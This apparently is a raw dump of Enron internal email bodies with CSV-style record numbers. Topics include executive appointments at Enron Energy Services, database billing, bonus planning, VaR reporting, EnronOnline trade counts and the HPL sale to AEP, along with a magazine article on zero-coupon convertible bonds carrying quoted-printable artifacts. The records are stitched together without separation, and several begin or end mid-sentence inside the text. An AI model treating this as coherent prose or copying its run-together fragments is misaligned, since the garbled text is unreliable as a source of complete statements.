to start and develop new businesses has driven most of our growth over the 
years.  Lou L. Pai, currently Chairman and CEO of Enron Energy Services, will 
lead the Xcelerator.  Over his years at Enron, Lou has been key to the 
creation and rapid growth of our wholesale gas, wholesale power and energy 
service businesses.  The existing business units will continue their 
development of core businesses, while the Xcelerator will be responsible for 
developing new business opportunities that are natural extensions of Enron's 
business model and core skills, but not currently under development elsewhere 
in Enron.

Dave Delainey, currently President and CEO of Enron Americas, will become 
Chairman and CEO of Enron Energy Services.  Dave brings a wealth of 
experience and accomplishment from Enron Wholesale Services' businesses where 
he led the growth of our Canadian business and our North American origination 
activity and, most recently, had a great year in Enron Americas.

Dietrich as Chief Operating Officer.  Janet, currently is Managing Director 
in Enron Americas, where she has been successful in many of Enron Wholesale's 
core businesses, including gas trading, risk management and structural 
origination.  Tom White will continue as Vice Chairman of EES and will focus 
on the development and expansion of EES' customer relationships.  Lou, Tom, 
Dan, Marty and the entire EES organization have developed a great business 
model with great growth prospects.  EES has become an essential part of 
Enron's market valuation and growth story.  This new leadership structure 
will enable EES to continue on its path of sustained growth and increasing 
profitability.

  All Priority # 2 CP's will be completed within 45 days ( March 23, 2001).

EES has approximately 14,000 counterparties to be entered into the GCP 
Database.  We have been dealing with EES' Karin Williams and  Scott Mills on 
the GCP set up.

We have quoted EES a rate of $20.00 per counterparty entered into the GCP 
Database.  We currently have 4 people working full time on the research, 
calling and entering of EES's CP's.  Beginning in January 2002, we anticipate 
utilizing a mutually agreed upon monthly fee.

Jason Moore and I are the designated Global contacts for EES in regard to GCP.



 GLOBAL  CONTRACTS  AND  GLOBAL  FACILITIES - 
 
In a February 16th meeting with Wanda Curry, Scott Mills, Mark Evans, and 
other EES personnel, EES indicated that they were leaning towards utilizing 
the Global Contracts Database.  We briefly discussed the Global Facilities 
Database, but we all have agreed to concentrate on the feasibility of the 
Contracts Database first and leave the Facilities implementation question for 
a later date.
  
As a result of the above mentioned meeting, we have an EES Demo set up for 
tomorrow morning from 9 A.M. - 12 P.M. in order to give EES personnel a 
""hands on"" demonstration of the functionality of Global Contracts.  A  
portion of EES's contracts include multiple commodities and staggering 
agreement terms that Global Contracts is now unable to capture.  Therefore, 
we will need to institute numerous system enhancements, with the co-operation 
of Global IT, in order to process EES' contracts.  The timing and IT manpower 
needs of these system enhancements will be discussed at our Demo by Global IT 
personnel.

If EES does agree to utilize Global Contracts and Facilities we will need to 
set up a separate EES maintenance group within Global.  

EES has informed us that they would like to do all of their Contracts Data 
input.  Therefore, we anticipate the use of 3 Global Contracts personnel for 
the training of EES'  personnel.  Two Global employees would be assigned to 
work directly with EES's personnel on a daily basis.  The remaining Global 
Contracts person would act as a ""Help Desk"" here on 37 to answer any Global 
Contracts questions. 

In regard to billing EES for the Global Contracts Database assistance, we are 
proposing the use of a ""flat rate""  monthly fee structure, similar to the one 
utilized  for Bridgeline Gas Pipeline.   We would also include a ""start up"" 
fee to cover the cost of the initial  IT system enhancements.

175,"Dear all,

If you recall, several months ago we held a meeting to discuss the bonus 
planning needs for Commercial and Commercial Support Analysts now that they 
have been combined into one program under the A/A Program umbrella.

I was asked to put together some information on how bonuses in 1999 compared 
between Merchant Service Analysts, Commercial Analysts and Commercial Support 
Sr. Specialists (and possibly even Managers) so that we could determine if 
there would be a 2000 bonus compression problem in Analysts being placed in 
Commercial Support positions and then having lower bonuses.  Attached below 
you will find the results of that research.

In short the conclusions are these:
The 2000 system allows a difference between Commercial and Commercial Support 
Analyst bonus matrices preventing the compression problem.
In 1999, Commercial Analyst and Commercial Support Sr. Specialist bonus 
matrices were comparable - and this can still occur in 2000.
Bonus structures can easily be planned for 2000 so that no compression 
problem occurs.



The data above is being sent to help you understand the concepts we discussed 
and put closure to the meeting.  The 2000 bonus planning system allows for a 
variation within Analyst categories (commercial and commercial support) and 
will meet the business needs.  Please let me know if you want to discuss 
further or would like to see the raw data used in the research.

181,"Mike,
Further to our conversation, here are some of the things I thought of while 
speaking with Tom Gros. There are definitely some challenges we have to 
overcome to make the Hub idea within CommodityLogic.com as successful as 
EnronOnLine rather than have it turn out like Sitara.

I won't repeat thoughts about how we split CL from Enron, but let's put 
ourselves in the shoes of somebody external for whom this was presented as a 
potential solution. Well, that's an easy decision, somebody else is doing the 
hard work, and not charging us very much for it. So sign-up, but don't rely 
on anything until we see everything working.

Handling counterparties not using the system
The challenge here is that the Final Solution World with overybody using the 
Hub is wonderful, but until everybody is using the Hub, we have to keep other 
procedures and systems going, which stretches resources, Development, IT 
Support and user. This was why we decided to delay getting Bolero - the 
concept is wonderful, but the value to any user is very dependent on everyone 
else one trades with using the system. This is classic Chicken and Egg. Tom 
has a vision of CL providing the staff to handle this. This is taking us 
closer to an outsource-to-Andersen-consulting model which is certainly 
achievable, although not quite such an easy sell.

How much resource is left
The latest project always tends to attract the most imaginative people, who 
are therefore not available for keeping everything else going and moving 
onwards. How about if we accept that such resource is dedicated to CL, and 
then review what is left in the remaining environment. Does it mean we hold 
off doing anything? If we do then increasing volume means that we might end 
up incurring costs for massive numbers of people! We should go through 
costing for ""What happens if we completely stop development of X project?"". 
If that shows one would need 200 clerks for 3 years until something else 
comes along then it may be cheaper than developing, but I hope in most cases 
it is not!

Start small to prove concept
E.g. first application in April 2001 only covers 20 fields
This is excellent, and we needn't shout it too loud to investors in CL, but 
for our internal back office costing we need to acknowledge that it will be 
years before we can switch off many internal systems.
We might limit the payback period on projects not part of this strategy to 3 
years out?

Include European aspects from the beginning
This really isn't very difficult so long as one has some long-on-common-sense 
Europeans (not just Brits) involved in both specification and development 
from the beginning, but an as example of how not to do it, look at EnPower 
which took a year to allow just for currencies etc!

80-20 rule for types of transaction
EOL has shown the benefits of focussing on simpler products first.
Once we have robust warehouses for collecting accounting (DTL) and risk 
(RisktRAC?) numbers then we can think about having vanilla products on STP, 
and yet-to-become-vanilla products on explicitly different, manual 
approaches. Until that time, we have a strong desire to include as many 
different prodcuts as possible for a given commodity in one system, which 
makes separating vanillas from others more complicated and costly (Think of 
certain deals in Power99 which are approximations of the actual deals, and 
manually tweaked every so often)

Testing
Tom's first thought is that we could leverage initial users (who would not 
pay) to do much of the testing.
EOL clearly got its testing done, but other experience shows that in order to 
have anything which saves time one really does need to do all the different 
phases - component, system, integration, end-to-end, and then user-acceptance.
EOL saw confidentiality as an issue and was therefore unable to use many 
external users early in the process. It did have massive 
resource-commandability and so obtained input from many traders. Do the 
Support functions have sufficient slack that they will be able to provide the 
same sort of user attention? Given how often I hear ""short people"", that 
strikes me as something which in London would require significant additional 
resource, even after MG is absorbed.

What else did you come up with?

It was an irresistible proposition: Borrow billions of dollars, pay no inte=
rest, reap millions in tax breaks, and then wait for the debt to simply dis=
appear. That was the promise of zero-coupon convertible bonds, and companie=
s from Enron to Merrill Lynch binged on what seemed like free money.=20
But, of course, there was a catch: For this scenario to play out, a company=
's stock price had to rise sharply--and quickly. That's because investors b=
ought the bonds in the hope of converting them into equity--if the stock ta=
nked, the bonds would no longer be worth converting. So to make them more a=
ttractive to buyers, companies had to build in an escape hatch: If the stoc=
k price failed to rise sufficiently, investors could ""put"" (that is, sell) =
the bonds back to the company--in many cases, after just one year.
And that's exactly what's about to happen--to the tune of some $65 billion =
over the next three years. Stock prices have fallen so far that for at leas=
t half of these special hybrids, the prospect of conversion is now absurd. =
It simply won't happen. So bondholders are looking to get their money back =
the first chance they can. And because of the put feature, that is possible=
. Suddenly companies like Tyco, Comcast, and dozens more are on the hook fo=
r billions of dollars in debt and interest they thought they'd never have t=
o pay.=20
That could be very bad news for shareholders of these companies. After all,=
 they're the ones who are going to be picking up the tab when all that debt=
 comes due. Huge chunks of cash will disappear from balance sheets to repay=
 bondholders. Companies without enough cash-- and the majority fall into th=
is camp--are likely to face skyrocketing interest charges when they borrow =
money anew. That means sharply reduced earnings. Especially at risk are inv=
estors in companies with poor credit ratings--prime candidates for killer r=
efinancing costs. Some companies may even be forced to issue stock to pay o=
ff the debt, creating significant shareholder dilution, especially at curre=
nt depressed prices. To make matters worse, this is happening at a time whe=
n the economy is barreling downhill and corporate profits are already shrin=
king. ""This is a ticking time bomb,"" warns Margaret Patel, manager of the P=
ioneer High Yield Bond fund, a top-performing junk fund.=20
The seeds of this mess were sown in mid-2000, when the stock market started=
 to falter. Companies in search of capital balked at the thought of selling=
 stock while their share prices were struggling. Zero-coupon convertible bo=
nds presented an attractive alternative because companies didn't have to ma=
ke cash interest payments on the bonds (hence the name ""zero""). Instead iss=
uers offered an up-front discount--for instance, investors would buy a bond=
 for $700 and collect $1,000 when it matured.=20
Companies also gave investors the right to convert the bonds into a fixed n=
umber of common shares. But the bonds were structured so that conversion wo=
uld make sense only if the stock price rose significantly--in many cases, b=
y more than 50%. With that protective feature (called the conversion premiu=
m), zeros took off. Corporate issuers would pay no interest, and once their=
 stock prices had climbed back to acceptable levels, the debt would be swep=
t away into equity. ""If the bonds are converted, it's a home run for everyb=
ody,"" says Jonathan Cohen, vice president of convertible-bond analysis at D=
eutsche Bank.=20
That four-bagger, of course, depends entirely on the stock price rising. If=
 it doesn't, the bondholders, armed with that handy put feature, can simply=
 sell the bonds back to the company. Great for bondholders, but not so hot =
for the company or its shareholders. But, hey, what are the odds of that ha=
ppening? ""CFOs and CEOs believe that their stock will just continue to go u=
p,"" says Cohen. ""They don't worry about the bond getting put.""=20
If all this seems a little complicated, that's because it is. A real-life e=
xample should help. California-based electric utility Calpine issued $1 bil=
lion in zeros in April to refinance existing debt. At the time, the company=
's stock was trading at about $55 a share--severely undervalued in the opin=
ion of company management. ""We really didn't want to sell equity at that po=
int,"" says Bob Kelly, Calpine's senior vice president of finance. So the co=
mpany instead opted to sell zeros, setting the conversion premium at a heft=
y 37%.=20
Still, with no cash interest payments and a stock price that had to rise si=
gnificantly to make conversion worthwhile, the bonds weren't exactly a scre=
aming buy for investors. So Calpine added the put feature: Investors could =
sell the bonds back to the company after one year at the full purchase pric=
e, eliminating any downside risk.=20
Things haven't exactly worked out as management had hoped. The stock has si=
nce plummeted to $25, and it now has to triple before conversion makes sens=
e. So it's looking as though Calpine will be liable for the $1 billion in b=
orrowed money when investors get the chance to put the bonds this April. Th=
ere's also the refinancing cost. According to Kelly, Calpine's borrowing ra=
te could run in the neighborhood of 8.5%--an extra $85 million per year in =
cash. ""Obviously, nobody plans for their stock to go down,"" Kelly says. ""I =
don't think there was one person around who thought the bond would be put.""=
=20
Calpine's potential costs are particularly high because its credit rating i=
s straddling junk. ""If you are a borderline investment-grade company, a fin=
ancing of this nature is not necessarily the most appropriate thing in the =
world,"" notes Anand Iyer, head of global convertible research at Morgan Sta=
nley. The problem is, there are a slew of companies with far worse credit r=
atings out there: Jeff Seidel, Credit Suisse First Boston's head of convert=
ible-bond research, estimates that about half of all zeros outstanding fall=
 into the junk category. And others are at risk of having their ratings dow=
ngraded before the put date. Today, with junk yielding as much as 5 1/2 per=
centage points above bonds rated investment grade, refinancing can be a pri=
cey proposition.=20
Contract manufacturer Solectron is one that could well get hit by the high =
price of junk. It has $845 million in zeros that it will probably have to b=
uy back this January, and another $4.2 billion coming down the pike over th=
e next couple of years. Because of slower- than-expected sales, the company=
 was recently put on negative credit watch by three rating agencies. And if=
 Solectron's credit is downgraded, the zeros would slide into junk status, =
a situation that could cost the company--and its shareholders--tens of mill=
ions of dollars in refinancing charges.=20
Refinancing isn't the only worrisome cost associated with these zeros. Comp=
anies pay hefty investment banking fees to sell their bonds--up to 3% of th=
e amount raised. If the debt is sold back, many will have spent millions fo=
r what essentially amounted to a one-year loan. ""They're getting bad advice=
,"" claims one banker who didn't want to be named. ""Look at the fee the bank=
er earned and look at the kind of financing risk the company got into.""=20
As if those potential consequences were not scary enough, shareholders can =
also get whacked when the bonds are first issued. That's because some 40% a=
re bought by hedge funds, which short the company's stock (sell borrowed sh=
ares with the intention of buying them back at a lower price) at the same t=
ime that they buy the bonds. If the stock goes down, the shorts make money =
from their position. If it goes up, they profit by converting the bond to s=
tock. This hedging strategy almost always causes the stock to plummet, at l=
east for a while. Grocery chain Supervalu, for example, recently lost 10% o=
f its market cap the day it announced it was issuing $185 million in zeros.=
=20
Despite all the pitfalls, the love affair with such Pollyanna bonds continu=
es, thanks in large part to the slick tax and accounting loopholes they pro=
vide. In fact, the hit on earnings per share can be the lowest of any form =
of financing. Even better, thanks to a wrinkle in the tax code, companies c=
an rake in huge tax savings by deducting far more interest than they're act=
ually paying. All they have to do is agree to pay small amounts of interest=

VALUE AT RISK

The Value at Risk (VaR) seminar is designed to introduce participants to this 
important concept.  An understanding of VaR is rapidly becoming an integral 
business need.  The first session of this seminar provides participants with 
a comprehensive review of statistics, these being the primary building block 
of VaR itself.  The program then moves on to identify examples of the context 
in which clients are using VaR in their business decisions.  Participants 
will gain an understanding of the interrelationship of the many factors that 
make VaR a dynamic and strategic tool.  The program ends with a ""hands on"" 
experience of making a simple VaR calculation.

Participants attending this seminar will be able to:

Give a precise definition of Value at Risk
Describe how VaR is changing the way companies evaluate risk in their 
businesses
Discuss how these changing views of risk will impact the use of hedging  
products
Recognize why companies are implementing VaR
Explain the key factors in calculating VaR
Understand the need to categorize risk into ""Risk Buckets""
Define the standardizing practice of Risk Mapping
Illustrate a simple VaR model and accurately discuss the modeling         
process
Calculate a simple two product VaR number
Demonstrate the difference between the Historical, Monte Carlo and Risk 
Metrics  approaches to VaR
Evaluate the impact of correlation on the calculation of VaR
Understand the application and importance of stress testing",Sally Tim,,"Risk Mapping

199,"We have created four additional graphs to be published daily along with the 
DPR: 

Return on VaR (ROVAR)
Curve Shift P&L (Delta - Gamma) Sharpe Ratio
Risk - Return (Large)
Risk - Return (Small)

All of these graphs deal with the concept of risk-adjusted return.  The 
markets in which we operate have unlike risk characteristics.  Furthermore, 
Enron's appetite for risk also differs in each market.  As a result, it is 
difficult to compare returns in absolute terms.  Therefore, the approach of 
these graphs is to divide return by a measure of risk, in effect restating 
return numbers into a standard base (how many dollars we earn for every 
dollar we put at risk).


 For each business unit or commodity group, the ROVAR graph shows an average 
of daily total P&L divided by an average of daily VaR.  Higher ROVARs 
indicate better performance (relative to other business units).  For each 
business unit or commodity group there are two bars: the dark blue on the 
left shows ROVAR on a 4 week (20 business day) rolling basis, and the light 
blue on the right shows ROVAR on a 1 week (5 business day) rolling basis.  
Because of the shorter term, the 1 week ROVAR is more sensitive: it can be 
quite high or low, and it changes frequently.


The Sharpe Ratio graph is very similar in concept; it shows an average of 
daily curve shift P&L (both delta and gamma) divided by its standard 
deviation. This Sharpe ratio is uncomplicated by non-trading P&L (like new 
deals, reserves, and so forth).  Furthermore, whereas VaR is a forward 
looking statistic (the most we are likely to lose in one day with a given 
probability), standard deviation is backward looking (the actual volatility 
of our returns over the period). This graph also has two bars for every 
business unit or commodity group: a dark brown on the left showing the Sharpe 
ratio on a 4 week rolling basis, and a light brown on the right showing the 
ratio on a 1 week basis.

The Curve Shift P&L Sharpe Ratio and the ROVAR graphs complement each other 
well.  They measure different things, but if our P&L is composed mostly of 
curve shift, and if our VaR closely predicts curve shift volatility, the two 
statistics should be very close.


Sometimes it is interesting to see the actual magnitude of the P&L relative 
to the risk.  We therefore put together the Risk - Return graphs.  On the 
vertical axis, they show 4 week rolling average P&L.  On the horizontal, they 
show 4 week rolling average VaR.  The various business units are plotted as 
points on the graphs.  These graphs are closely related to the 4-week ROVARs, 
in that the vertical value of every point divided by its horizontal value is 
the business unit's ROVAR (average P&L / average VaR).  Another way of 
looking at these graphs is that the slope of a line connecting the origin 
(0,0) with the plotted point of a business unit is its ROVAR.  Books with 
small risks and returns (< $2 million) are plotted on the ""Small"" graph, and 
the rest, on the ""Large"".

These graphs are based on the DPR Database that we built to standardize and 
capture the information that is reported in the DPR.  Most, but not all of 
the information in the DPR currently flows from the database.  As a result, 
we do not have ROVARs or Sharpe Ratios for every business unit.  As we 
continue to set up exports into the database, we will fill in the missing 
numbers.

We will e-mail you these graphs every day until we can publish them on the 
intra-net.  Please remember to launch the file in Excel, instead of using the 
Lotus Notes viewer.  The VaR Limit Usage graphs that we created last week are 
already on the web.  We hope that you find all of these useful.

After speaking with Richard Burchfield and Brian Hudson, I thought that it 
would be appropriate to update both of you and Beth as to IT's commitment.  
Richard asked that he send out the message and I agreed.  One reason for 
doing this was to show that the Operations and IT groups are working together 
towards a common goal.  The other reason was to ensure that I had IT's buy-in 
to completing this database in a timely fashion.

Our main goal will be to deliver the basic tools that any trading business 
would need and then to continue to develop the more advanced analytics in Q1 
2001.  The actual roll out will happen in phases prior to January so that we 
begin the new year with a complete database which includes deal capture, 
valuation, and the necessary reporting and accounting tools.  By using Brian 
Hudson's IT team I can be assured that the global needs are met.

I will be in the office next week if you want to discuss this further,

without exchange traded future transactions.


Notes for this Week's Report:

*   North American Gas has increased its overall average daily EOL deal count 
by over 1,000 trades a day since October.  There are now approximately 3,100 
trades a day in North American Gas alone which are being traded on EOL.

*  The newly combined East Region in North American Gas has approximately 
doubled its average daily EOL deal count and average daily EOL volume since 
October.

*  The newly combined Central Region in North American Gas has increased its 
average daily EOL deal count about 38% since October, from 498 to 685 deals 
per day.   However, the average daily EOL volume has remained steady since 
October.

*  The newly named Financial Desk in North American Gas has increased its 
average daily EOL deal count about 41% since October, from 494 to 698 deals 
per day.  In addition, the average daily EOL volume has increased about 25% 
since October.

*  California Power has increased its average daily EOL deal count by over 
32% since October.  The average daily EOL volume for California Power has 
more than doubled since October.

*  Midwest Power has increased its average daily EOL volume by about 75% 
since October.  However, the average daily EOL deal count for Midwest Power 
has remained steady since October.

*  Southeast Power has decreased its average daily EOL deal count by over 51% 
since October.  The average daily EOL volume for Southeast Power has 
decreased significantly as well.  However, these are approximately the levels 
we had seen in prior months before October. 

*  UK Power has more than doubled its average daily EOL deal count since 
October from 8 deals to over 15 deals.  The average daily EOL volume has  
remained fairly level.

*  Nordic Power has increased its average daily EOL deal count about 45% 
since October, from 20 to 29 deals per day.  In addition, the average daily 
EOL volume has increased about 25% since October.

*  US Weather has steadily decreased its total monthly EOL deal count from a 
high in June of 241 deals to recent low of only 25 deals.  However, there has 
been a slight increase in November to 31 EOL US Weather deals with one more 
day to go..  

*  Enron Metals trades done via EOL has risen by approximately 85% since 
October, from a daily average of 150 to a daily average of 280 for November.

*  Coal trades have decreased significantly from the levels seen in October.  
The total monthly EOL deal count for November stands now at only about 21% of 
the total in October with only one more day to go.

Brent and I have updated the agenda for the changes we made the other night.  
I am sending this to you for your own use.  Remember that we will walk 
through this again on Sunday night to make sure we're still on the right 
track.

Please don't distribute the agenda or share it with the session 
participants.  I'm sure they are starting to ask the question - ""So, what are 
we going to do while we're there?"" - in fact I've had folks ask me that 
already.  My typical response is to reiterate the goals of the session and 
explain that we will do a series of exercies in both large and small group 
formats.  And, when they continue to press for more (as I've found they 
typically do) - I politely let them know that more details will be shared 
when we kick off the session on Monday morning.  Now, if they are curious 
about what an ASE is and why they have to go to Dallas for it, you can cover 
that too or have them call me.

Team, I think we're really close to being ready.  I'm going to spend the rest 
of the day pulling together our input documents so if you have anything you 
want included send it on!

Wednesday and Thursday, February 7 and 8.  

Do either one of you have a specific issue that needs to be addressed that I

pretty full, but I can add to that anything that you know of that we need to 
address.  Just let me know.

223,"I talked with Anne Koehler in Legal today to determine her understanding of 
what is required from Energy Operations prior to the effective sale of HPL.  
Anne believes that she may have been the one to introduce the term ""protocol"" 
into these discussions.  To clarify, according to Anne, the ""protocol"" is not 
anticipated to be a formal legal document.  Instead, Anne envisions simply 
e:mails or memos between Enron and AEP with regard to any sharing of 
information, agreements on processes to be followed in the transition, etc.  
Operational details to be decided between Enron and AEP have been handled 
exactly in that manner to date, with e:mails being sent from Bob Ball (Enron) 
to Steve Jackson (AEP).  

Only critical changes to the Purchase and Sale Agreement will be formally 
documented.  Bob Hall identified the treatment of cash accounts in the 
original Purchase and Sale Agreement as incorrect relative to cash flows for 
gas to be delivered in the month of May.  He has worked with Enron's treasury 
group to establish the correct procedures and has worked with Sandi Braband 
in Legal to document this change to the Purchase and Sale Agreement as an 
Amendment to that agreement.   As of today, Legal has completed revisions to 
that amendment and Anne Koehler is sending it to Mary Perkins in Enron's 
Treasury group for her review.  Upon Mary's review, Anne will forward the 
amendment to AEP for their review before final signatures.  

We devised this week a new format for incorporating the AEP-HPL transition 
issues on which my team has been focused and have provided that to both of 
you.  This new format incorporates the various memos and e:mails which have 
to date captured the status of transition issues.  Items that only require 
actions by Enron will be our ""to do"" list.  Each item has a due date and we 
will update you weekly on progress.  Those items that fall under the AEP list 
or which appear in both the Enron and AEP list will be the items to which we 
will evidence communication to AEP and/or their agreement via the e:mails or 
memos as suggested by Ann Koehler.  I believe that this should satisfy your 
requests earlier this week for written ""protocol"".   We will also update you 
weekly on the status of those e:mails and/or memos between ourselves and 
AEP.  

I understand that the two of you have a regular weekly meeting for an update 
on the HPL sale.  To provide clarity for these update meetings, may I suggest 
that we incorporate one of the following two approaches: 

 1)  Brian and I hold a regular meeting just prior to your update meeting so 
that Brian has a full   understanding of operational transition items and 
their status, or 

 2) I attend the first part of your update meeting in order to provide a 
firsthand update to the two of you.  

Please let me know which one of these works best for you so that we can 
incorporate that into our schedules for next week.

Generally, this seems to be fine.  I think that Steve and I would like to 
clarify the credit limit review issue.  Please see him for some semantical 
changes to that one line.  
Regarding the expected/maximum exposure calculation,  I believe that this is 
incredibly misleading and if not changed would be inclined to forward my own 
interpretation.    WE LOST $18MM!!!!!!!!!!!!!!!!!!!  - NOT $5MM.  I think 
that we should make a distinction between what has already been realized as 
opposed to what writedowns need to be taken, but it all better add up to 
$18MM.  Regarding the additional exposures, my impression is that our true 
expectation for counterparty claims is close to zero while we do expect to 
terminate one or more employees which would incur severance cost.

reversal of last accrual and creating new accrual).   This condition goes 
back to Jan. 99 for Unify, Jan. 95 for pre-Unify PMAs, and becomes worse each 
month as more such items are accumulated.

better  progress has been achieved in Power settlement.  It is essential this

As you are probably aware the Continental Power book split project went well 
but there were a number of areas which were not completed for one reason or 
another but essentially IT did not deliver according to the agreed timetable. 
Todd was instrumental in helping me to drive this forward and was responsible 
for much of what we achieved.

As you may also be aware we had some personnel issues and there have been 
significant changes in the Continental Risk Management team. We have now 
recruited a strong manager in Coralie Evans from CSFB and she starts on the 
29th of August. We have also added Michelle Waldhauser from the Houston Gas 
Risk Management team who arrived on the 7th of August.

There are a number of issues and developments which would greatly benefit 
from having Todd here in London for around a month (I say around a month as I 
am guessing within this period he would want to spend some time in Oslo 
pushing the weather Risk Management area forward). Attached is a page I put 
together that cover our immediate needs and why Todd is ideally placed to 
potentially add an enormous amount of value to the Continental Power business.

Could we please get together with Brent Price and Mike Jordan and discuss 
whether Todd would be available come over.

Guys, I want to clear up a couple of points:
	a) if you had received a retention payment in early December with a date that expires Feb 28 - that retention payment will not be at risk in any way if you do not work for NETCO or if you choose to join the effort towards NewCo. That payment was made on behalf of the Enron estate to ensure critical operations  are completed and  key people are retained;
	b) we are working to provide, as per our discussion this am, a new retention package for estate (and NewCo) employees for the next 90 days that should be forthcoming in the next several weeks;
	c) you are not in breach of your employement agreement by working towards NewCo versus Netco or the overall estate regardless of which company wrote or sponsored your original contract (ie) ENA , EES, EGM, etc.  These are all Enron assets; and
	d) I envision that NewCo upon it formation will have its own compensation plan which will provide competitive base salaries, a bonus program consistent or better than Enron's or possibly similar to what is being discussed about Netco, an equity participation plan, employment agreements and a competitive benefits package.

By copy to Jeff McMahon, I wanted everyone to know this is consistent with the overall message that I have been receiving.

253,"Japan's Electricity Newspaper (""Denki Shimbun"", the equivalent of Megawatt 
Daily) has been running a series of articles about the new century.  Several 
of these have focused on the power industry in the U.S.  A friend of mine ran 
across one on Enron that was published on April 13 and sent it to me.  I 
thought you would find it interesting.

The article focuses on EES in particular and about how we try to succeed by 
being first to meet our clients' changing needs.  It also describes how we 
use derivatives and risk management to reduce costs and stay competitive.  
The article also briefly mentions the new office in Japan.

The most interesting thing about the article is how incredibly positive it is 
about Enron.  Given what I have read and heard about how nervous the Japanese 
are about deregulation of the industry, I really did not expect such praise.

Denki Shimbun also has a web site at ""www.shimbun.denki.or.jp"".  They have 
small summaries of the important articles of the day (the site, however, is 
completely in Japanese).  Another interesting site is

has many links to other English-language sites related to the power industry

To share with the others our telephone discussion, the notification template 
was not my request, it was requested directly by Skilling.  I know your group 
is working hard to meet mangagement expectations, and in accordance with your 
request below, Market Risk is happy to help you transition into this revised 
reporting format by reviewing the template prior to your distribution until 
you are comfortable with the reporting requirements.   The new P/L 
notification limits and limit changes that will be in effect  next Tuesday 
should dramatically decrease the number of notifications, so that should 
help.  It probably makes sense to re-distribute the policy to your business 
unit controllers and the traders so they understand the policy requirements.

Another issue that we discussed yesterday is the source of the violation 
explanations.  These should be provided to you by the head trader of that 
commodity group.  Under the policy, that commodity group manager is 
responsible for compliance with the risk management policy for the 
commodities under his responsibility, along with the head of the energy ops 
for that commodity group.  If the traders are not providing these 
explanations to you or to your counterparts (ops desk head / business unit 
controller), I'll be happy to send them an e-mail explaining their compliance 
obligation under the policy.  Why don't you talk to each of the business unit 
controllers, consider whether a process is already in place for this feedback 
(as I understand it is for Global Products, for example), and if you'd like 
me to send an e-mail to whoever you're having difficulty with, I will - just 
let me know who.  Our Market Risk desk heads will be happy to review their 
explanations, but the problem is, they can see whether they're short or long 
and how the market moved in comparison, but it's the trader that can and 
should explain why they took a position, whether they're adjusting it based 
on the market moves, etc.. 

Let me know what else I can do to help streamline the process.

All applicants must fill out and sign an Application and a Fair Credit

interviewed.   You may either have the applicant fill out a form before you 
interview them or you can send the applicant to the 36th floor to fill out 
the forms before you interview them.     
Notify Hector McLoughlin or Frank deJesus if you are interviewing an external 
candidate that is a former Enron employee.    All previous Enron employees 
will be reviewed by HR and Sally Beck prior to being invited to interview.   
We hope that this process will eliminate re-hiring poor performers.

Dear Energy Operations:

As I have reflected upon the accomplishments of this group, I wanted to 
express my appreciation for all the hard work and dedication that you have 
demonstrated.  We have done great work and I want to recognize you for that.  

Although we have done much, we have much yet to do.  Therefore, as we go 
forward, I want to make sure that you have all the necessary tools to do the 
best possible job, and that any barriers that may impede your work are 
removed.

To help in this effort, I have asked a consulting organization -- S.J. Bashen 
Corporation -- to survey our organization; to ""take its pulse"" if you will; 
to help us understand what we do well and not so well; in essence, to assist 
us in acquiring the ""necessary tools"" and breaking down any ""barriers.""  SJBC 
is comprised of seasoned consultants who assist organizations like our to 
help on issues like this.  SJBC will meet with members of our group in a 
private setting where we can highlight our successes, discuss our concerns, 
ask our questions, make our comments, and the like.  This collective 
information (who said what is not disclosed) then is studied by SJBC with the 
goal of providing us an opinion regarding our strengths and weaknesses.

Many of you will be receiving a phone call in the near future from a SJBC 
consultant.  Please schedule a time to partcipate at your earliest 
opportunity, as this effort will be a success for our group only if we 
cooperate to the fullest extent.  Of course, given the size of our group, it 
will not be possible to meet with each of you.  Therefore, if you have not 
received a call from SJBC by August 15 but would like to share your thoughts 
with them, please feel free to contact Cheryl Brown at 713.780.8056 and 
Cheryl will be glad to include you in our survey.

Communication is one of Enron's core values.  I want to stress that, only by 
open communication will this survey be a success.  Please be candid.  Thank 
you.

270,"I assume this meeting is strictly for Accenture and PWC to pitch their vision 
to Enron on how they would help add value or help Enron execute mid/back 
office and/or CommodityLogic in a commercial manner.  I don't want this 
meeting related at all to Andy's efforts with Accenture related to 
transaction feeds unless Andy thinks it is OK.

I have told Baldwin at Accenture that Mid/back office and CommodityLogic is 
separate from what he is working on with Dave Samuals and Andy on Transaction 
hubs and is separate from DealBench, etc.  If we are not careful, Accenture 
will be working with four or five different points of contact at Net Works 
and we will end up hurting ourselves.

I am counting on Salley, Rex, Andy and Tom ASAP to each understand what the 
other is doing with Accenture and make sure there is no way Accenture can 
work us to our disadvantage. I also think Accenture needs to earn our 
business because others can do what they are offering.

Also, check with Rex Shelby on PWC.  We just had an uncomfortable experience 
with PWC that everyone should understand.  I recommended an Accenture meeting 
but if Tom wants PWC, he should understand what they did to Rex.

Remember, all of this is very confidential so let's be very careful 
internally and no meetings without transaction specific NDAs.

Your thoughts?

Good luck.

things. We made progress.....but we also have issues to work. 


Summary On Improvements For This End Of Month Close

I would like to congratulate the users, the application team and the DBA team 
for a much improved end of month close for August gas. This would not have 
been possible without the significant commitment, focus and teamwork 
exhibited by all the folks involved in this effort. 

The most tangible measure of progress over the July close : 
We were able to keep all users in the system throughout the final week. No 
one was kicked off the system.
The gas accounting close process finished on time. Key users and IT folks 
didn't have to work significant overtime to finish the process. 

 Improvements arose from : 

Upgrading the Unify system to Sybase 12 with extra server memory. This 
reduced system 'locking and blocking' and made it possible to keep all users 
in the system throughout the week. Nightly settlements for gas invoicing also 
ran much faster. Many thanks to the DBAs - Jim Ogg and Kishroe Bharathi-- for 
many late nights and weekends. Many thanks also to the application team and 
the users for lots of testing before the production rollout.

Conducting a pre-planning session that identified new end of month techniques 
to improve efficiency. The users generated several new ideas including the 
idea to pre-process PMAs the night before running the current mass draft. 
This meeting provided several new approaches, a clear plan and cohesive 
communication throughout the end of month process. Many thanks to the all the 
users as well as Bob Superty, Bryce Baxter, Melissa Ratnala, Dave Nommensen 
and Chris Schomer for making this happen. Many of these ideas will now be 
part of a standard process. 

The performance monitoring and tuning team reacted quickly to address changes 
in system performance. Many thanks to Matt Pena and the rest of this team for 
keeping the system up and running as fast as possible during the day. 

Release of a new tuned version of the Accurals process that runs much faster. 


Issues, Challenges, Action Items

While we made progress this month, there are still several significant issues 
and opportunities for improvement. The following is a list of the things that 
'went bump in the night' and the action items we've identified. 

1. We experienced several Sybase 12.0 errors early in the week that impacted 
gas business. All of these problems are now fixed. This had the following 
business impacts: 
The bridgeback of deals to Sitara was delayed. These deals were bridged 
manually before the end of month valuation. We also fixed the code problem 
that generated th original problem.
Global Systems replication to Unify was down on Monday. This problem was 
